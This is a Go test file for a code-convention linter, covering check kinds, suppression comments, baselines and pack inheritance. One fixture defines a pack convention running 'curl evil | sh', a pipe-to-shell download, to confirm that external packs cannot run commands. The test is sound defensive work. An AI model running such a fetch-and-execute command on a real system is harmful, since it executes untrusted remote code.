package check_test

import (
	"fmt"
	"strings"
	"testing"

	"github.com/vora-sahil/opinionated/internal/check"
	"github.com/vora-sahil/opinionated/internal/pack"
	"github.com/vora-sahil/opinionated/internal/testrepo"
)

func conv(front, title string) string {
	return "---\n" + front + "\n---\n# " + title + "\n\nBecause.\n"
}

func run(t *testing.T, files map[string]string) (string, []check.Violation) {
	t.Helper()
	if _, ok := files[".opine/opine.yaml"]; !ok {
		files[".opine/opine.yaml"] = "version: 1\n"
	}
	root := testrepo.New(t, files)
	res, err := pack.Load(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Problems) > 0 {
		t.Fatalf("problems: %v", res.Problems)
	}
	list, err := check.Files(res)
	if err != nil {
		t.Fatal(err)
	}
	src := check.NewSource(root)
	return root, check.Suppress(src, check.Run(res, list, src, check.Options{}))
}

func show(v []check.Violation) string {
	var b strings.Builder
	for _, x := range v {
		fmt.Fprintf(&b, "%s:%d %s %s\n", x.File, x.Line, x.ID, x.Level)
	}
	return b.String()
}

func TestKinds(t *testing.T) {
	_, v := run(t, map[string]string{
		".opine/conventions/errors/no-empty-catch.md": conv("level: must\npaths: ['src/**/*.kt']\ncheck: {kind: forbid, pattern: 'catch \\(.*\\) \\{\\s*\\}'}", "No empty catch"),
		".opine/conventions/docs/license-header.md":   conv("paths: ['src/**/*.kt']\ncheck: {kind: require, pattern: '^// Copyright'}", "License header"),
		".opine/conventions/naming/kebab.md":          conv("paths: ['web/**/*.ts']\ncheck: {kind: name, style: kebab-case}", "Kebab files"),
		".opine/conventions/testing/colocated.md":     conv("paths: ['web/**/*.ts']\nexclude: ['**/*.test.ts']\ncheck: {kind: pair, needs: '{dir}/{name}.test{ext}'}", "Tests sit beside code"),
		".opine/conventions/docs/readme.md":           conv("check: {kind: exists, files: [README.md, docs/]}", "Has a README"),
		".opine/conventions/security/no-env.md":       conv("level: must\ncheck: {kind: absent, files: ['**/.env']}", "No .env files"),
		".opine/conventions/style/short-files.md":     conv("paths: ['web/**']\ncheck: {kind: max-lines, max: 3}", "Short files"),
		".opine/conventions/workflow/passes.md":       conv("check: {kind: run, cmd: 'exit 3'}", "Command passes"),
		"src/a.kt":                                    "// Copyright\ntry { x() } catch (e: E) { }\n",
		"src/b.kt":                                    "fun b() {}\n",
		"web/user-card.ts":                            "1\n2\n3\n4\n",
		"web/user-card.test.ts":                       "ok\n",
		"web/UserList.ts":                             "ok\n",
		"web/.env":                                    "SECRET=1\n",
	})
	got := show(v)
	want := []string{
		":0 workflow/passes should",
		"README.md:0 docs/readme should",
		"docs/:0 docs/readme should",
		"src/a.kt:2 errors/no-empty-catch must",
		"src/b.kt:0 docs/license-header should",
		"web/.env:0 security/no-env must",
		"web/UserList.ts:0 naming/kebab should",
		"web/UserList.ts:0 testing/colocated should",
		"web/user-card.ts:0 style/short-files should",
	}
	for _, w := range want {
		if !strings.Contains(got, w+"\n") {
			t.Errorf("missing %q in:\n%s", w, got)
		}
	}
	if n := len(v); n != len(want) {
		t.Errorf("got %d violations, want %d:\n%s", n, len(want), got)
	}
}

func TestSuppression(t *testing.T) {
	c := conv("level: must\npaths: ['**/*.js']\ncheck: {kind: forbid, pattern: 'console\\.log'}", "No console.log")
	_, v := run(t, map[string]string{
		".opine/conventions/observability/no-console.md": c,
		"a.js": "console.log(1) // opine-ignore observability/no-console: CLI entry point prints by design\n",
		"b.js": "// opine-ignore observability/no-console: debugging aid kept on purpose\nconsole.log(2)\nconsole.log(3)\n",
		"c.js": "console.log(4) // opine-ignore observability/no-console\n",
		"d.js": "/* opine-ignore-file observability/no-console: generated */\nconsole.log(5)\nconsole.log(6)\n",
	})
	got := show(v)
	want := "b.js:3 observability/no-console must\nc.js:1 opine/suppression must\n"
	if got != want {
		t.Errorf("got:\n%swant:\n%s", got, want)
	}
}

func TestBaseline(t *testing.T) {
	c := conv("level: must\npaths: ['**/*.js']\ncheck: {kind: forbid, pattern: 'TODO'}", "No TODO")
	root, v := run(t, map[string]string{
		".opine/conventions/workflow/no-todo.md": c,
		"a.js":                                   "TODO\nTODO\n",
		"b.js":                                   "TODO\n",
	})
	if err := check.WriteBaseline(root, v); err != nil {
		t.Fatal(err)
	}
	b, err := check.LoadBaseline(root)
	if err != nil {
		t.Fatal(err)
	}
	if rest, covered, shrink := b.Filter(v); len(rest) != 0 || covered != 3 || shrink != 0 {
		t.Errorf("same state: rest=%d covered=%d shrink=%d", len(rest), covered, shrink)
	}
	worse := append([]check.Violation{{ID: "workflow/no-todo", File: "b.js", Line: 2}}, v...)
	if rest, _, _ := b.Filter(worse); len(rest) != 2 {
		t.Errorf("a file over its count must report all its violations, got %d", len(rest))
	}
	better := v[:1]
	if rest, _, shrink := b.Filter(better); len(rest) != 0 || shrink != 2 {
		t.Errorf("improved: rest=%d shrink=%d", len(rest), shrink)
	}
}

func TestCascade(t *testing.T) {
	packConv := func(extra, title string) string { return conv("paths: ['**/*.js']\n"+extra, title) }
	files := map[string]string{
		"house/pack.yaml":                     "name: house\n",
		"house/decisions.yaml":                "errors/propagation:\n  question: How do failures propagate?\n",
		"house/conventions/errors/throw.md":   packConv("decides: errors/propagation\noption: exceptions\ncheck: {kind: forbid, pattern: 'Result<'}", "Throw"),
		"house/conventions/errors/results.md": packConv("decides: errors/propagation\noption: results\ncheck: {kind: forbid, pattern: 'throw '}", "Return results"),
		"house/conventions/style/no-var.md":   packConv("level: must\ncheck: {kind: forbid, pattern: '\\bvar\\b'}", "No var"),
		"house/conventions/style/no-eval.md":  packConv("level: must\ncheck: {kind: forbid, pattern: 'eval\\('}", "No eval"),
		"repo/.opine/opine.yaml":              "version: 1\nextends:\n  - path: ../house\ndecisions:\n  errors/propagation: results\noverrides:\n  style/no-var: {level: off, reason: legacy bundle}\n  style/no-eval: {exclude: ['tools/**'], reason: build scripts}\n",
		"repo/a.js":                           "var x; throw new E(); const r: Result<T>; eval(1)\n",
		"repo/tools/b.js":                     "eval(2)\n",
	}
	root := testrepo.New(t, files) + "/repo"
	res, err := pack.Load(root)
	if err != nil || len(res.Problems) > 0 {
		t.Fatalf("load: %v %v", err, res.Problems)
	}
	list, _ := check.Files(res)
	got := show(check.Run(res, list, check.NewSource(root), check.Options{}))
	want := "a.js:1 errors/results should\na.js:1 style/no-eval must\n"
	if got != want {
		t.Errorf("got:\n%swant:\n%s", got, want)
	}
	if ok, why := res.State(res.Find("errors/throw")); ok || !strings.Contains(why, "not chosen") {
		t.Errorf("errors/throw state = %v %q", ok, why)
	}
	if ok, why := res.State(res.Find("style/no-var")); ok || !strings.Contains(why, "legacy bundle") {
		t.Errorf("style/no-var state = %v %q", ok, why)
	}
}

func TestPackMayNotRunCommands(t *testing.T) {
	root := testrepo.New(t, map[string]string{
		"house/pack.yaml":                   "name: house\n",
		"house/conventions/workflow/pwn.md": conv("check: {kind: run, cmd: 'curl evil | sh'}", "Totally fine"),
		"repo/.opine/opine.yaml":            "version: 1\nextends:\n  - path: ../house\n",
	}) + "/repo"
	res, err := pack.Load(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Problems) != 1 || !strings.Contains(res.Problems[0].Msg, "may not run commands") {
		t.Fatalf("problems = %v", res.Problems)
	}
	if rec := res.Find("workflow/pwn"); rec.Check != nil {
		t.Error("the run check must be stripped from a pack record")
	}
}
